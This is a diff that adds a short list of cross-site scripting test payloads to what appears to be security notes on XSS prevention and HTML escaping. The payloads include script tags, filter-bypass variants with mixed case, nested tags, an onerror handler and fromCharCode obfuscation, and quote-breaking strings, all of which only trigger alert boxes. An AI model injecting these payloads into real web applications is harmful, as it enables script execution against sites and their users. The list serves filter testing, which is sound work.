@@ -26,3 +26,19 @@
   - ```'``` => ```&#x27;```
   - ```/``` => ```&#x2F;```
 - [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 
+
+## Payloads
+```Javascript
+a<script>alert('ehsan')</script>
+a<SCript>alert('ehsan')</SCript>
+a<scri<script>pt>alert('ehsan')</scri</script>pt>
+a<img src='aaa' onerror='alert("ehsan")'/>
+a<script>prompt('ehsan')</script>
+a<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 101, 104, 115, 97, 110, 39, 41))</script>
+a";alert("ehsan");//
+a";alert("ehsan");"
+a';alert('ehsan');//
+a';alert('ehsan');'
+/"><script>alert('ehsan')</script>
+```
+  
